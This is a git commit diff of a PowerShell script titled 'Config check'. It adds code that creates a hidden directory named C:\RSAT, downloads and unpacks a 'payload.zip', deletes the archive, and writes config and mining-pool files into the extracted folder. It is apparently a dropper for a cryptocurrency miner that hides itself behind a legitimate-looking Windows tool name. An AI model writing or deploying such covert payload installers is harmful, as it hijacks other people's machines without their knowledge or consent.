a43c321a24530f2e064dc353ed575ee466e206f8
velvet-valdes <valdestr@gmail.com>
2018-05-19 21:00:20 -0400

    Config check
    getting a diff of a KG config

--- advancePartyBeta.ps1
+++ advancePartyBeta.ps1
@@ -1,5 +1,7 @@
 Import-Module "${psscriptroot}\APFunctions.psm1"
 
+# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1
+
 $opsDirectory = "C:\RSAT"
 
 if (!(Test-Path $opsDirectory))
@@ -9,9 +11,29 @@ if (!(Test-Path $opsDirectory))
 	$f.Attributes = "Hidden"
 }
 
-#payload test.zip
-stripExcess (configTpl) | Out-File config.txt
-stripExcess (poolTpl) | Out-File pools.txt
-alterConfigTpl config.txt
-alterPoolTpl pools.txt
+# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.
+
+$payloadDestination = "$opsDirectory\payload.zip"
+
+if (!(Test-Path $payloadDestination)) 
+
+{
+payload $payloadDestination
+}
+
+# Unzip contents of file and remove payload
+
+Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
+Remove-Item $payloadDestination
+
+
+# Load the newly unzipped directory path into a variable and set the destiation path to extract the config.
+
+$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
+$stakDir = "$opsDirectory\$unzipDir"
+
+stripExcess (configTpl) | Out-File "$stakDir\config.txt"
+stripExcess (poolTpl) | Out-File "$stakDir\pools.txt"
+alterConfigTpl "$stakDir\config.txt"
+alterPoolTpl "$stakDir\pools.txt"
 read-host -promt "yo"
